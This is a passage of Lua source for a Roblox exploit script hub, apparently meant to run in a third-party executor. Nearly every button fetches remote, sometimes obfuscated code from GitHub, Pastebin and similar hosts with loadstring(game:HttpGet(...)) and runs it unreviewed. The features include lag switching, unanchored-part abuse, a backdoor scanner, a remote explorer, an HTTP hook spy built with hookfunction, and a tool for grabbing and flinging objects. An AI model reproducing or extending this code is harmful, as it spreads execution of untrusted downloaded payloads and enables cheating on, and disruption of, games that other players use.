scn42.MouseButton1Click:Connect(function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
end)

local scn43 = Instance.new("TextButton")
scn43.Parent = sc
scn43.Name = "scn43"
scn43.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn43.Position = UDim2.new(0.00996587239, 0, 0.63, 0)
scn43.BackgroundColor3 = Color3.new(0, 0, 0)
scn43.BorderColor3 = Color3.new(0, 1, 0)
scn43.BorderSizePixel = 3
scn43.TextColor3 = Color3.new(1, 1, 1)
scn43.TextScaled = true
scn43.Font = Enum.Font.Roboto
scn43.Text = "Lag Switch"
scn43.Visible = false
scn43.MouseButton1Click:Connect(function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Protected%20-%202023-05-28T225112.055.lua.txt'),true))()
end)

local scn44 = Instance.new("TextButton")
scn44.Parent = sc
scn44.Name = "scn44"
scn44.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn44.Position = UDim2.new(0.18, 0, 0.63, 0)
scn44.BackgroundColor3 = Color3.new(0, 0, 0)
scn44.BorderColor3 = Color3.new(0, 1, 0)
scn44.BorderSizePixel = 3
scn44.TextColor3 = Color3.new(1, 1, 1)
scn44.TextScaled = true
scn44.Font = Enum.Font.Roboto
scn44.Text = "Unanchored Abuse"
scn44.Visible = false
scn44.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/cowka/c0wkaHub/refs/heads/main/UnanchoredParts'))()
end)

local scn45 = Instance.new("TextButton")
scn45.Parent = sc
scn45.Name = "scn45"
scn45.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn45.Position = UDim2.new(0.35, 0, 0.63, 0)
scn45.BackgroundColor3 = Color3.new(0, 0, 0)
scn45.BorderColor3 = Color3.new(1, 0, 0)
scn45.BorderSizePixel = 3
scn45.TextColor3 = Color3.new(1, 1, 1)
scn45.TextScaled = true
scn45.Font = Enum.Font.Roboto
scn45.Text = "Keystroke Gui"
scn45.Visible = false
scn45.MouseButton1Click:Connect(function()
loadstring(game:HttpGet(('https://pastefy.app/Te4dwSw2/raw'),true))()
end)

local scn46 = Instance.new("TextButton")
scn46.Parent = sc
scn46.Name = "scn46"
scn46.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn46.Position = UDim2.new(0.52, 0, 0.63, 0)
scn46.BackgroundColor3 = Color3.new(0, 0, 0)
scn46.BorderColor3 = Color3.new(0, 1, 0)
scn46.BorderSizePixel = 3
scn46.TextColor3 = Color3.new(1, 1, 1)
scn46.TextScaled = true
scn46.Font = Enum.Font.Roboto
scn46.Text = "Car Bouncer"
scn46.Visible = false
scn46.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://files.scriptifer.com/roblox/scripts/FE_Car_Bouncer.txt"))()
end)

local scn47 = Instance.new("TextButton")
scn47.Parent = sc
scn47.Name = "scn47"
scn47.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scn47.Position = UDim2.new(0.69, 0, 0.63, 0)
scn47.BackgroundColor3 = Color3.new(0, 0, 0)
scn47.BorderColor3 = Color3.new(0, 1, 0)
scn47.BorderSizePixel = 3
scn47.TextColor3 = Color3.new(1, 1, 1)
scn47.TextScaled = true
scn47.Font = Enum.Font.Roboto
scn47.Text = "Energizer Gui"
scn47.Visible = false
scn47.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Energize-10408"))()
end)

local scn48 = Instance.new("TextButton")
scn48.Parent = sc
scn48.Name = "scn48"
scn48.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scn48.Position = UDim2.new(0.86, 0, 0.63, 0)
scn48.BackgroundColor3 = Color3.new(0, 0, 0)
scn48.BorderColor3 = Color3.new(1, 0, 0)
scn48.BorderSizePixel = 3
scn48.TextColor3 = Color3.new(1, 1, 1)
scn48.TextScaled = true
scn48.Font = Enum.Font.Roboto
scn48.Text = "Telekinesis v6"
scn48.Visible = false
scn48.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty1.lua"))()
end)

local scn49 = Instance.new("TextButton")
scn49.Parent = sc
scn49.Name = "scn49"
scn49.Size = UDim2.new(0.473003626, 0, 0.101999998, 0)
scn49.Position = UDim2.new(0.519000053, 0, 0.799999893, 0)
scn49.BackgroundColor3 = Color3.new(0, 0, 0)
scn49.BorderColor3 = Color3.new(1, 0, 0)
scn49.BorderSizePixel = 2
scn49.TextColor3 = Color3.new(1, 1, 1)
scn49.TextScaled = true
scn49.Font = Enum.Font.Roboto
scn49.Text = "PShade Ultimate"
scn49.Visible = false
scn49.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua'))()
--PShade Ultimate web : https://randomstring0.github.io/pshade.github.io/
end)

local scn50 = Instance.new("TextButton")
scn50.Parent = sc
scn50.Name = "scn50"
scn50.Size = UDim2.new(0.490003586, 0, 0.101999998, 0)
scn50.Position = UDim2.new(0.00999999978, 0, 0.800000012, 0)
scn50.BackgroundColor3 = Color3.new(0, 0, 0)
scn50.BorderColor3 = Color3.new(1, 0, 0)
scn50.BorderSizePixel = 2
scn50.TextColor3 = Color3.new(1, 1, 1)
scn50.TextScaled = true
scn50.Font = Enum.Font.Roboto
scn50.Text = "HttpSpy"
scn50.Visible = false
scn50.MouseButton1Click:Connect(function()
local HttpSpy = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TitleBar = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TitleText = Instance.new("TextLabel")
local MainContainer = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local UIPadding = Instance.new("UIPadding")

-- Properties
HttpSpy.Name = "HttpSpy"
HttpSpy.Parent = game.CoreGui
HttpSpy.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainFrame.Name = "MainFrame"
MainFrame.Parent = HttpSpy
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.05, 0, 0.25, 0)
MainFrame.Size = UDim2.new(0, 400, 0, 300)

UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = MainFrame

TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 30)

UICorner_2.CornerRadius = UDim.new(0, 10)
UICorner_2.Parent = TitleBar

TitleText.Name = "TitleText"
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Position = UDim2.new(0, 10, 0, 0)
TitleText.Size = UDim2.new(1, -40, 1, 0)
TitleText.Font = Enum.Font.GothamSemibold
TitleText.Text = "HTTP Spy v2"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextSize = 14
TitleText.TextXAlignment = Enum.TextXAlignment.Left

local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Parent = TitleBar
MinimizeButton.BackgroundTransparency = 1
MinimizeButton.Position = UDim2.new(1, -30, 0, 0)
MinimizeButton.Size = UDim2.new(0, 30, 1, 0)
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 20

MainContainer.Name = "MainContainer"
MainContainer.Parent = MainFrame
MainContainer.BackgroundTransparency = 1
MainContainer.Position = UDim2.new(0, 0, 0, 30)
MainContainer.Size = UDim2.new(1, 0, 1, -30)
MainContainer.ScrollBarThickness = 4
MainContainer.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 80)

UIListLayout.Parent = MainContainer
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 5)

UIPadding.Parent = MainContainer
UIPadding.PaddingLeft = UDim.new(0, 10)
UIPadding.PaddingRight = UDim.new(0, 10)
UIPadding.PaddingTop = UDim.new(0, 10)

local NotificationFrame = Instance.new("Frame")
local NotificationText = Instance.new("TextLabel")

NotificationFrame.Name = "NotificationFrame"
NotificationFrame.Parent = HttpSpy
NotificationFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
NotificationFrame.BorderSizePixel = 0
NotificationFrame.Position = UDim2.new(1, -220, 1, -60)
NotificationFrame.Size = UDim2.new(0, 200, 0, 40)
NotificationFrame.Visible = false

local NotificationCorner = Instance.new("UICorner")
NotificationCorner.CornerRadius = UDim.new(0, 5)
NotificationCorner.Parent = NotificationFrame

NotificationText.Name = "NotificationText"
NotificationText.Parent = NotificationFrame
NotificationText.BackgroundTransparency = 1
NotificationText.Size = UDim2.new(1, 0, 1, 0)
NotificationText.Font = Enum.Font.GothamSemibold
NotificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
NotificationText.TextSize = 14
NotificationText.Text = "Log copied to clipboard!"

local isMinimized = false

MinimizeButton.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized

    if not isMinimized then
        MainContainer.Visible = true
        MainFrame.Size = UDim2.new(0, 400, 0, 300)
        MinimizeButton.Text = "-"
        return
    end

    MainContainer.Visible = false
    MainFrame.Size = UDim2.new(0, 400, 0, 30)
    MinimizeButton.Text = "+"
end)

-- Functions
local function createDraggable(gui)
    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end

        dragging = true
        dragStart = input.Position
        startPos = gui.Position

        input.Changed:Connect(function()
            if input.UserInputState ~= Enum.UserInputState.End then return end
            dragging = false
        end)
    end)

    gui.InputChanged:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
        dragInput = input
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input ~= dragInput or not dragging then return end
        update(input)
    end)
end

createDraggable(MainFrame)

local function registerDynamicScrollingFrame(frame)
    local layout = frame:FindFirstChildWhichIsA("UIListLayout")

    local function updateCanvasSize()
        frame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
    end

    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSize)
    updateCanvasSize()
end

registerDynamicScrollingFrame(MainContainer)

local function showNotification()
    NotificationFrame.Visible = true
    task.wait(2)
    NotificationFrame.Visible = false
end

local function formatLogEntry(method, url, headers)
    if not method or not url then
        return ""
    end

    local text = method .. "\n" .. url

    if not headers or type(headers) ~= "table" then
        return text
    end

    text ..= "\n\nHeaders:"
    for key, value in pairs(headers) do
        text ..= string.format("\n%s: %s", tostring(key), tostring(value))
    end

    return text
end

local function createLogEntry(method, url, headers)
    local LogEntry = Instance.new("TextButton")
    LogEntry.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    LogEntry.BorderSizePixel = 0
    LogEntry.Size = UDim2.new(1, 0, 0, 30)
    LogEntry.Font = Enum.Font.SourceSansSemibold
    LogEntry.TextColor3 = Color3.fromRGB(220, 220, 220)
    LogEntry.TextSize = 14
    LogEntry.TextWrapped = true
    LogEntry.TextXAlignment = Enum.TextXAlignment.Left
    LogEntry.TextYAlignment = Enum.TextYAlignment.Top
    LogEntry.AutoButtonColor = false

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 5)
    UICorner.Parent = LogEntry

    local UIPadding = Instance.new("UIPadding")
    UIPadding.Parent = LogEntry
    UIPadding.PaddingLeft = UDim.new(0, 10)
    UIPadding.PaddingRight = UDim.new(0, 10)
    UIPadding.PaddingTop = UDim.new(0, 5)
    UIPadding.PaddingBottom = UDim.new(0, 5)

    local logText = formatLogEntry(method, url, headers)
    LogEntry.Text = logText
    LogEntry.Parent = MainContainer

    local textSize = game:GetService("TextService"):GetTextSize(
        LogEntry.Text,
        LogEntry.TextSize,
        LogEntry.Font,
        Vector2.new(MainContainer.AbsoluteSize.X - 40, math.huge)
    )
    LogEntry.Size = UDim2.new(1, 0, 0, textSize.Y + 10)

    local OriginalColor = LogEntry.BackgroundColor3

    LogEntry.MouseEnter:Connect(function()
        LogEntry.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    end)

    LogEntry.MouseLeave:Connect(function()
        LogEntry.BackgroundColor3 = OriginalColor
    end)

    LogEntry.MouseButton1Click:Connect(function()
        setclipboard(logText)
        showNotification()
    end)

    MainContainer.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y)
end

-- HTTP Spy Logic
local HttpGet
HttpGet = hookfunction(game.HttpGet, function(self, url, ...)
    createLogEntry("HTTP GET", url)
    return HttpGet(self, url, ...)
end)

local HttpPost
HttpPost = hookfunction(game.HttpPost, function(self, url, ...)
    createLogEntry("HTTP POST", url)
    return HttpPost(self, url, ...)
end)

local RequestLog
if syn and syn.request then
    RequestLog = hookfunction(syn.request, function(dat)
        createLogEntry(dat.Method or "REQUEST", dat.Url, dat.Headers)
        return RequestLog(dat)
    end)
elseif request then
    RequestLog = hookfunction(request, function(dat)
        createLogEntry(dat.Method or "REQUEST", dat.Url, dat.Headers)
        return RequestLog(dat)
    end)
else
    createLogEntry("WARNING", "Your exploit is not supported!")
end
end)

 scne51 = Instance.new("TextButton")
scne51.Parent = sc
scne51.Name = "scne51"
scne51.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne51.Position = UDim2.new(0.00996587239, 0, 0.03, 0)
scne51.BackgroundColor3 = Color3.new(0, 0, 0)
scne51.BorderColor3 = Color3.new(0, 1, 0)
scne51.BorderSizePixel = 3
scne51.TextColor3 = Color3.new(1, 1, 1)
scne51.TextScaled = true
scne51.Font = Enum.Font.Roboto
scne51.Text = "Sound Player"
scne51.Visible = false
scne51.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ShutUpJamesTheLoser/fesound/refs/heads/main/Fesound"))()
	notif({
		Text = "The Sound sometimes will works on some Car Games or Games with Car Inside.",
		Duration = 5,
		topm = "Information!"
	})
end)

 scne52 = Instance.new("TextButton")
scne52.Parent = sc
scne52.Name = "scne52"
scne52.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne52.Position = UDim2.new(0.18, 0, 0.03, 0)
scne52.BackgroundColor3 = Color3.new(0, 0, 0)
scne52.BorderColor3 = Color3.new(1, 0, 0)
scne52.BorderSizePixel = 3
scne52.TextColor3 = Color3.new(1, 1, 1)
scne52.TextScaled = true
scne52.Font = Enum.Font.Roboto
scne52.Text = "Decal Logger"
scne52.Visible = false
scne52.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/ReLWGiQV"))()
end)

 scne53 = Instance.new("TextButton")
scne53.Parent = sc
scne53.Name = "scne53"
scne53.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne53.Position = UDim2.new(0.35, 0, 0.03, 0)
scne53.BackgroundColor3 = Color3.new(0, 0, 0)
scne53.BorderColor3 = Color3.new(1, 0, 0)
scne53.BorderSizePixel = 3
scne53.TextColor3 = Color3.new(1, 1, 1)
scne53.TextScaled = true
scne53.Font = Enum.Font.Roboto
scne53.Text = "Starlight Backdoor Scanner"
scne53.Visible = false
scne53.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TempUserIdk18/robloxscripts/refs/heads/main/PogsBackdoor.lua"))()
end)

 scne54 = Instance.new("TextButton")
scne54.Parent = sc
scne54.Name = "scne54"
scne54.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne54.Position = UDim2.new(0.52, 0, 0.03, 0)
scne54.BackgroundColor3 = Color3.new(0, 0, 0)
scne54.BorderColor3 = Color3.new(0, 1, 0)
scne54.BorderSizePixel = 3
scne54.TextColor3 = Color3.new(1, 1, 1)
scne54.TextScaled = true
scne54.Font = Enum.Font.Roboto
scne54.Text = "Grab Unanchored Tool"
scne54.Visible = false
scne54.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Throw settings (default values)
local throwForce = 50
local throwUpForce = 10

-- GUI variables
local gui = nil
local frame = nil

-- Tool logic
local grabTool = Instance.new("Tool")
grabTool.Name = "Grab"
grabTool.RequiresHandle = false

local handle = Instance.new("Part")
handle.Name = "Handle"
handle.Size = Vector3.new(0.5, 0.5, 0.5)
handle.Transparency = 1
handle.CanCollide = false
handle.Parent = grabTool

-- GUI creation function
local function createGUI()
    if gui then gui:Destroy() end
    
    gui = Instance.new("ScreenGui")
    gui.Name = "GrabToolGUI"
    gui.ResetOnSpawn = false
    gui.Parent = player.PlayerGui

    frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 200, 0, 120)
    frame.Position = UDim2.new(0, 10, 1, -130) -- Bottom left corner with padding
    frame.AnchorPoint = Vector2.new(0, 1)
    frame.BackgroundTransparency = 0.7
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Throw Settings"
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Parent = frame

    -- Horizontal force slider
    local forceLabel = Instance.new("TextLabel")
    forceLabel.Text = "Throw Force: "..throwForce
    forceLabel.Size = UDim2.new(1, 0, 0, 20)
    forceLabel.Position = UDim2.new(0, 0, 0, 30)
    forceLabel.BackgroundTransparency = 1
    forceLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    forceLabel.Parent = frame

    local forceSlider = Instance.new("TextBox")
    forceSlider.Size = UDim2.new(0.9, 0, 0, 20)
    forceSlider.Position = UDim2.new(0.05, 0, 0, 50)
    forceSlider.Text = tostring(throwForce)
    forceSlider.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    forceSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
    forceSlider.Parent = frame

    -- Vertical force slider
    local upForceLabel = Instance.new("TextLabel")
    upForceLabel.Text = "Upward Force: "..throwUpForce
    upForceLabel.Size = UDim2.new(1, 0, 0, 20)
    upForceLabel.Position = UDim2.new(0, 0, 0, 70)
    upForceLabel.BackgroundTransparency = 1
    upForceLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    upForceLabel.Parent = frame

    local upForceSlider = Instance.new("TextBox")
    upForceSlider.Size = UDim2.new(0.9, 0, 0, 20)
    upForceSlider.Position = UDim2.new(0.05, 0, 0, 90)
    upForceSlider.Text = tostring(throwUpForce)
    upForceSlider.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    upForceSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
    upForceSlider.Parent = frame

    forceSlider.FocusLost:Connect(function(enterPressed)
        local newValue = tonumber(forceSlider.Text)
        if newValue and newValue >= 0 and newValue <= 500 then
            throwForce = newValue
            forceLabel.Text = "Throw Force: "..throwForce
        else
            forceSlider.Text = tostring(throwForce)
        end
    end)

    upForceSlider.FocusLost:Connect(function(enterPressed)
        local newValue = tonumber(upForceSlider.Text)
        if newValue and newValue >= 0 and newValue <= 100 then
            throwUpForce = newValue
            upForceLabel.Text = "Upward Force: "..throwUpForce
        else
            upForceSlider.Text = tostring(throwUpForce)
        end
    end)
end

grabTool.Equipped:Connect(function()
    createGUI()
end)

grabTool.Unequipped:Connect(function()
    if gui then
        gui:Destroy()
        gui = nil
    end
end)

grabTool.Parent = player.Backpack

local mouse = player:GetMouse()
local heldModel = nil
local originalCollisions = {}
local bodyVelocity = nil

local function disableModelCollisions(model)
    originalCollisions = {}
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            originalCollisions[part] = part.CanCollide
            part.CanCollide = false
        end
    end
end

local function restoreModelCollisions()
    for part, canCollide in pairs(originalCollisions) do
        if part and part.Parent then
            part.CanCollide = canCollide
        end
    end
    originalCollisions = {}
end

local function pullItem(target)
    if heldModel then return end
    
    heldModel = target:FindFirstAncestorOfClass("Model") or target
    disableModelCollisions(heldModel)
    
    local primaryPart = heldModel.PrimaryPart or heldModel:FindFirstChildWhichIsA("BasePart")
    if not primaryPart then return end
    
    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyVelocity.Parent = primaryPart
    
    game:GetService("RunService").Heartbeat:Connect(function()
        if not heldModel or not bodyVelocity then return end
        
        local handlePos = grabTool.Handle.Position
        local partPos = primaryPart.Position
        local direction = (handlePos - partPos).Unit * 50
        
        bodyVelocity.Velocity = direction
    end)
end

local function throwItem()
    if not heldModel then return end
    
    local primaryPart = heldModel.PrimaryPart or heldModel:FindFirstChildWhichIsA("BasePart")
    if not primaryPart then return end
    
    restoreModelCollisions()
    
    if bodyVelocity then
        bodyVelocity:Destroy()
        bodyVelocity = nil
    end
    
    local camera = workspace.CurrentCamera
    local throwDirection = (mouse.Hit.Position - camera.CFrame.Position).Unit
    
    local throwVelocity = Instance.new("BodyVelocity")
    throwVelocity.Velocity = throwDirection * throwForce + Vector3.new(0, throwUpForce, 0)
    throwVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    throwVelocity.Parent = primaryPart
    
    game:GetService("Debris"):AddItem(throwVelocity, 0.5)
    
    heldModel = nil
end

grabTool.Activated:Connect(function()
    if not grabTool.Parent:IsA("Model") then return end
    
    if heldModel then
        throwItem()
        return
    end
    
    local target = mouse.Target
    if target and not target.Anchored and not target:IsDescendantOf(character) then
        pullItem(target)
    end
end)
end)

 scne55 = Instance.new("TextButton")
scne55.Parent = sc
scne55.Name = "scne55"
scne55.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne55.Position = UDim2.new(0.69, 0, 0.03, 0)
scne55.BackgroundColor3 = Color3.new(0, 0, 0)
scne55.BorderColor3 = Color3.new(1, 0, 0)
scne55.BorderSizePixel = 3
scne55.TextColor3 = Color3.new(1, 1, 1)
scne55.TextScaled = true
scne55.Font = Enum.Font.Roboto
scne55.Text = "Wallhop Gui"
scne55.Visible = false
scne55.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/ScpGuest666/Random-Roblox-script/refs/heads/main/Roblox%20WallHop%20V4%20script'))()
end)

 scne56 = Instance.new("TextButton")
scne56.Parent = sc
scne56.Name = "scne56"
scne56.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scne56.Position = UDim2.new(0.86, 0, 0.03, 0)
scne56.BackgroundColor3 = Color3.new(0, 0, 0)
scne56.BorderColor3 = Color3.new(1, 0, 0)
scne56.BorderSizePixel = 3
scne56.TextColor3 = Color3.new(1, 1, 1)
scne56.TextScaled = true
scne56.Font = Enum.Font.Roboto
scne56.Text = "Remote Explorer"
scne56.Visible = false
scne56.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/CoolExploit/TestLua/refs/heads/main/RemoteExplorer', true))()
end)

 scne57 = Instance.new("TextButton")
scne57.Parent = sc
scne57.Name = "scne57"
scne57.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne57.Position = UDim2.new(0.00996587239, 0, 0.229999959, 0)
scne57.BackgroundColor3 = Color3.new(0, 0, 0)
scne57.BorderColor3 = Color3.new(1, 1, 0)
scne57.BorderSizePixel = 3
scne57.TextColor3 = Color3.new(1, 1, 1)
scne57.TextScaled = true
scne57.Font = Enum.Font.SourceSans
scne57.Text = "LownasAI Chatbot"
scne57.Visible = false
scne57.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxipt3/LownasAI/refs/heads/main/Script.lua"))()
end)

 scne58 = Instance.new("TextButton")
scne58.Parent = sc
scne58.Name = "scne58"
scne58.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne58.Position = UDim2.new(0.18, 0, 0.229999959, 0)
scne58.BackgroundColor3 = Color3.new(0, 0, 0)
scne58.BorderColor3 = Color3.new(0, 1, 0)
scne58.BorderSizePixel = 3
scne58.TextColor3 = Color3.new(1, 1, 1)
scne58.TextScaled = true
scne58.Font = Enum.Font.SourceSans
scne58.Text = "Fly Unanchored Parts"
scne58.Visible = false
scne58.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rscripts.net/raw/unanchored-fly_1745773171181_EsosnVx0fx.txt",true))()
	notif({
		Text = "To choose the object to fly you need to hold down the Ctrl button and click on the object. And to cancel you need to press Shift.",
		Duration = 10,
		topm = "Information!"
	})
end)

 scne59 = Instance.new("TextButton")
scne59.Parent = sc
scne59.Name = "scne59"
scne59.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne59.Position = UDim2.new(0.35, 0, 0.229999959, 0)
scne59.BackgroundColor3 = Color3.new(0, 0, 0)
scne59.BorderColor3 = Color3.new(1, 0, 0)
scne59.BorderSizePixel = 3
scne59.TextColor3 = Color3.new(1, 1, 1)
scne59.TextScaled = true
scne59.Font = Enum.Font.Roboto
scne59.Text = "Coordinates Gui"
scne59.Visible = false
scne59.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LiarRise/Copy-Location/refs/heads/main/README.md"))()
end)

 scne60 = Instance.new("TextButton")
scne60.Parent = sc
scne60.Name = "scne60"
scne60.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne60.Position = UDim2.new(0.52, 0, 0.229999959, 0)
scne60.BackgroundColor3 = Color3.new(0, 0, 0)
scne60.BorderColor3 = Color3.new(0, 1, 0)
scne60.BorderSizePixel = 3
scne60.TextColor3 = Color3.new(1, 1, 1)
scne60.TextScaled = true
scne60.Font = Enum.Font.Roboto
scne60.Text = "Hats Pet"
scne60.Visible = false
scne60.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty56.lua"))()

--[[
This script will check if the executor you are using has a replicatesignal
if the executor has a replicatesignal the script will have a permanentdeath function and hats re-claims method and also support in many games such as brookhaven and almost any games
and if it does not have a replicatesignal the script will automatically use the respawn loop method
]]
end)

 scne61 = Instance.new("TextButton")
scne61.Parent = sc
scne61.Name = "scne61"
scne61.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne61.Position = UDim2.new(0.69, 0, 0.229999959, 0)
scne61.BackgroundColor3 = Color3.new(0, 0, 0)
scne61.BorderColor3 = Color3.new(1, 0, 0)
scne61.BorderSizePixel = 3
scne61.TextColor3 = Color3.new(1, 1, 1)
scne61.TextScaled = true
scne61.Font = Enum.Font.Roboto
scne61.Text = "Zero Hub"
scne61.Visible = false
scne61.MouseButton1Click:Connect(function()
-- https://discord.gg/Ex7sRvpYYu
loadstring(game:HttpGet("https://raw.githubusercontent.com/dnezero/zerohub/refs/heads/main/main.lua"))()
end)

scne62 = Instance.new("TextButton")
scne62.Parent = sc
scne62.Name = "scne62"
scne62.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne62.Position = UDim2.new(0.00996587239, 0, 0.43, 0)
scne62.BackgroundColor3 = Color3.new(0, 0, 0)
scne62.BorderColor3 = Color3.new(1, 0, 0)
scne62.BorderSizePixel = 3
scne62.TextColor3 = Color3.new(1, 1, 1)
scne62.TextScaled = true
scne62.Font = Enum.Font.Roboto
scne62.Text = "Roblox Music Player"
scne62.Visible = false
scne62.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Maan04ka/CodingScripts/main/MusicUI.lua"))()
end)

scne63 = Instance.new("TextButton")
scne63.Parent = sc
scne63.Name = "scne63"
scne63.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne63.Position = UDim2.new(0.18, 0, 0.43, 0)
scne63.BackgroundColor3 = Color3.new(0, 0, 0)
scne63.BorderColor3 = Color3.new(1, 0, 0)
scne63.BorderSizePixel = 3
scne63.TextColor3 = Color3.new(1, 1, 1)
scne63.TextScaled = true
scne63.Font = Enum.Font.Roboto
scne63.Text = "Rave Hub\nMp3 Player"
scne63.Visible = false
scne63.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/qdbi/Rave-Hub/refs/heads/main/Rave%20Hub%20Language%20Selection", true))()
end)

scne64 = Instance.new("TextButton")
scne64.Parent = sc
scne64.Name = "scne64"
scne64.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne64.Position = UDim2.new(0.35, 0, 0.43, 0)
scne64.BackgroundColor3 = Color3.new(0, 0, 0)
scne64.BorderColor3 = Color3.new(0, 1, 0)
scne64.BorderSizePixel = 3
scne64.TextColor3 = Color3.new(1, 1, 1)
scne64.TextScaled = true
scne64.Font = Enum.Font.Roboto
scne64.Text = "Emotes Gui"
scne64.Visible = false
scne64.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://yarhm.mhi.im/scr?channel=afem"))()
end)

scne65 = Instance.new("TextButton")
scne65.Parent = sc
scne65.Name = "scne65"
scne65.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne65.Position = UDim2.new(0.52, 0, 0.43, 0)
scne65.BackgroundColor3 = Color3.new(0, 0, 0)
